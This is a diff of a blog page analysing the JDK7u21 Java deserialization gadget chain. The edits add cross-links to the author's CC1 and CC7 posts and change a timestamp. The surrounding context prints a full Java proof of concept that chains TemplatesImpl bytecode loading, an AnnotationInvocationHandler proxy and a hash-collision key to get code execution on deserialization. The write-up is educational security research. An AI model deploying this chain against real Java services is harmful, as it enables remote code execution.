@@ -29,7 +29,7 @@
 <meta property="og:image" content="https://3xsh0re.github.io/2024/10/14/JDK7u21%E9%93%BE%E5%88%86%E6%9E%90/image-20241014153637813.png">
 <meta property="og:image" content="https://3xsh0re.github.io/2024/10/14/JDK7u21%E9%93%BE%E5%88%86%E6%9E%90/image-20241014174043774.png">
 <meta property="article:published_time" content="2024-10-14T05:13:42.000Z">
-<meta property="article:modified_time" content="2024-10-14T09:40:45.753Z">
+<meta property="article:modified_time" content="2024-10-14T09:46:03.462Z">
 <meta property="article:author" content="3xsh0re">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="https://3xsh0re.github.io/2024/10/14/JDK7u21%E9%93%BE%E5%88%86%E6%9E%90/image-20241014141038977.png">
@@ -452,7 +452,7 @@ mjx-container[display="true"] + br {
 
 <p>在学习反序列化之初，一直是分析CC这种第三方库存在的链子，在Java原生库中也存在反序列化利用链。这条利用链就是JDK7u21，顾名思义，它适用于Java 7u21及以前的版本。从官网直接下是没有sun包源码的，这里提供一个<a target="_blank" rel="noopener" href="https://hg.openjdk.org/jdk7u/jdk7u2/jdk/file/58ad18490a50/src/share/classes">源码下载地址</a>。</p>
 <p>在<code>ysoserial</code>中也集成了，看看是怎么个构造法：</p>
-<p>粗略看来和之前的构造模式有很大不同，但也有许多相似之处，依然使用了动态加载类的方式进行命令执行，使用了<code>createProxy</code>，需要动态代理，在CC1-LazyMap中我们也使用了动态代理的思路，最后入口点在<code>LinkedHashSet</code>。</p>
+<p>粗略看来和之前的构造模式有很大不同，但也有许多相似之处，依然使用了动态加载类的方式进行命令执行，使用了<code>createProxy</code>，需要动态代理，在<a href="https://3xsh0re.github.io/2024/08/13/CC1%E9%93%BE-LazyMap/">CC1-LazyMap</a>中我们也使用了动态代理的思路，最后入口点在<code>LinkedHashSet</code>。</p>
 <img src="/2024/10/14/JDK7u21%E9%93%BE%E5%88%86%E6%9E%90/image-20241014141038977.png" srcset="/img/loading.gif" lazyload class="">
 
 <p>上面都是一些无端联想，下面具体来看这条链子：</p>
@@ -474,7 +474,7 @@ mjx-container[display="true"] + br {
 <p>CC2、CC4、CB1都是使用了<code>PriorityQueue</code>进行比较时触发的代码执行，具体来说是<code>Comparator</code>这一类；CC8是使用了<code>TreeMap</code>进行比较触发，也是<code>Comparator</code>。</p>
 <p>唯一涉及到了<code>equals</code>的只有CC7中使用的<code>Hashtable</code>类，判断是否相等时，然后去底层调用了<code>AbstractMapDecorator.equals()</code>。</p>
 <p>根据<code>ysoserial</code>的源码来看，<code>JDK7u21</code>使用的是<code>LinkedHashSet</code>类，似乎有着异曲同工之妙。</p>
-<p>具体分析，其本身没有实现<code>readObject</code>方法，继承自<code>HashSet</code>，这里使用了一个HashMap，将对象保存在HashMap的key处来做去重。去重的部分在最后<code>map.put</code>处实现，这不就和CC7很像，CC7中<code>Hashtable</code>调用了重新实现的<code>reconstitutionPut</code>。</p>
+<p>具体分析，其本身没有实现<code>readObject</code>方法，继承自<code>HashSet</code>，这里使用了一个HashMap，将对象保存在HashMap的key处来做去重。去重的部分在最后<code>map.put</code>处实现，这不就和CC7很像，CC7中<code>Hashtable</code>调用了重新实现的<code>reconstitutionPut</code>。<a href="https://3xsh0re.github.io/2024/10/02/CC7%E9%93%BE%E5%88%86%E6%9E%90/">我的CC7分析</a></p>
 <img src="/2024/10/14/JDK7u21%E9%93%BE%E5%88%86%E6%9E%90/image-20241014153637813.png" srcset="/img/loading.gif" lazyload class="">
 
 <p>下面是HashMap中的<code>put</code>方法，这里的i就是哈希表的索引值，后面的循环体中的工作就是对同一哈希索引下的元素去重。</p>
@@ -498,13 +498,6 @@ mjx-container[display="true"] + br {
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JDK7u21</span> {<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception {<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    }<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception {<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(templates, <span class="hljs-string">"_bytecodes"</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]{<br>                ClassPool.getDefault().get(CalcTempl.class.getName()).toBytecode()<br>        });<br>        setFieldValue(templates, <span class="hljs-string">"_name"</span>, <span class="hljs-string">"CalcTemplatesImpl"</span>);<br>        setFieldValue(templates, <span class="hljs-string">"_tfactory"</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">innerMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br><br>        <span class="hljs-comment">// 通过反射获取AnnotationInvocationHandler的实例</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">annotationConstructor</span> <span class="hljs-operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);<br>        annotationConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> (InvocationHandler) annotationConstructor.newInstance(Templates.class, innerMap);<br><br>        <span class="hljs-type">Templates</span> <span class="hljs-variable">proxy</span> <span class="hljs-operator">=</span> (Templates) Proxy.newProxyInstance(Templates.class.getClassLoader(),<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]{Templates.class},handler);<br><br>        <span class="hljs-type">LinkedHashSet</span> <span class="hljs-variable">linkedHashSet</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedHashSet</span>&lt;&gt;();<br>        linkedHashSet.add(templates);<br>        linkedHashSet.add(proxy);<br><br>        innerMap.put(<span class="hljs-string">"f5a5a608"</span>,templates);<br><br>        SerUtils.serialize(linkedHashSet,<span class="hljs-string">"JDK7u21.bin"</span>);<br>        SerUtils.unserialize(<span class="hljs-string">"JDK7u21.bin"</span>);<br>    }<br>}<br></code></pre></td></tr></table></figure>
 
 <img src="/2024/10/14/JDK7u21%E9%93%BE%E5%88%86%E6%9E%90/image-20241014174043774.png" srcset="/img/loading.gif" lazyload class="">
-
-
-
-
-
-
-
 
                 
               </div>
